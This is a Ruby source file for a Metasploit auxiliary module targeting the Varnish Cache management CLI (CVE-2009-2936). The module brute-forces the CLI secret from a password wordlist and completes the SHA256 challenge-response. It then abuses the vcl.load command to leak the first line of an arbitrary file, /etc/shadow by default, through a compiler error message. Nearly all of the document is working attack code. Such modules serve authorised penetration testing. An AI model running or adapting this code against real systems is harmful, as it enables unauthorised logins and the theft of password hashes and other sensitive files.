##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/varnish'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Varnish Cache CLI Login Utility and File Read',
      'Description'    => 'This module attempts to login to the Varnish Cache (varnishd) CLI instance using a bruteforce
                           list of passwords. This module will also cause an error in Varnish by load an arbitrary file
                           in order to read the first line of content from the insuing error message.',
      'References'     =>
        [
          [ 'OSVDB', '67670' ],
          [ 'CVE', '2009-2936' ],
          [ 'EDB', '35581' ],
          [ 'URL', 'https://www.varnish-cache.org/trac/wiki/CLI' ]
        ],
      'Author'         =>
        [
          'patrick', #original module
          'h00die <mike@shorebreaksecurity.com>' #updates and standardizations
        ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(6082),
        OptPath.new('PASS_FILE',  [ false, 'File containing passwords, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'unix_passwords.txt') ]),
        OptPath.new('FILE', [true, 'File to retrieve first line of', '/etc/shadow']),
        OptString.new('USERNAME', [false, 'A specific username to authenticate as', '<BLANK>']),
        OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false])
      ], self.class)

    # no username, only a shared key aka password
    #deregister_options('USERNAME', 'USER_FILE', 'USERPASS_FILE', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_USERS')

    # We don't currently support an auth mechanism that uses usernames, so we'll ignore any
    # usernames that are passed in.
    @strip_usernames = true
  end
  
  def setup
    super
    # They must select at least blank passwords, provide a pass file or a password
    one_required = %w(BLANK_PASSWORDS PASS_FILE PASSWORD)
    unless one_required.any? { |o| datastore.has_key?(o) && datastore[o] }
      fail_with(Failure::BadConfig, "Invalid options: One of #{one_required.join(', ')} must be set")
    end
    if !datastore['PASS_FILE']
      if !datastore['BLANK_PASSWORDS'] && datastore['PASSWORD'].blank?
        fail_with(Failure::BadConfig, "PASSWORD or PASS_FILE must be set to a non-empty string if not BLANK_PASSWORDS")
      end
    end
  end

  def read_file(password)
    connect
    sock.put("auth #{Rex::Text.rand_text_alphanumeric(3)}\n") # Cause a login fail.
    res = sock.get_once(-1,3) # grab challenge
    if res && res =~ /107 \d+\s\s\s\s\s\s\n(\w+)\n\nAuthentication required./ # 107 auth
      challenge = $1
      response = challenge + "\n"
      response << password + "\n"
      response << challenge + "\n"
      response = Digest::SHA256.hexdigest(response)
      sock.put("auth #{response}\n")
      res = sock.get_once(-1,3)
    end
    sock.put("vcl.load #{Rex::Text.rand_text_alphanumeric(3)} #{datastore['FILE']}\n") # only returns 1 line of any target file.
    res = sock.get_once(-1,3)

    # example format from /etc/shadow on an ubuntu box
    # Message from VCC-compiler:
    # Syntax error at
    # ('input' Line 1 Pos 5)
    # root:!:17123:0:99999:7:::
    # ----#--------------------

    if res && res =~ /\('input' Line \d Pos \d\)\n(...+)\n/
      print_good("First line of #{datastore['FILE']}: #{$1}:")
    else
      vprint_error("Unable to read #{datastore['FILE']}:\n#{res}\n")
    end
    disconnect
  end

  def run_host(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
      pass_file: datastore['PASS_FILE'],
      username: ''
    )
    vprint_status('made cred collector')
    scanner = Metasploit::Framework::LoginScanner::VarnishCLI.new(
      host: ip,
      port: rport,
      cred_details: cred_collection,
      stop_on_success: true,
      connection_timeout: 10,
      framework: framework,
      framework_module: self,

    )
    vprint_status('made scanner')
    scanner.scan! do |result|
      print(result)
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential.private}"
        connect
        read_file(result.credential.private)
        disconnect
      else
        invalidate_login(credential_data)
        vprint_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential.private} (#{result.status})"
      end
    end
  end
end
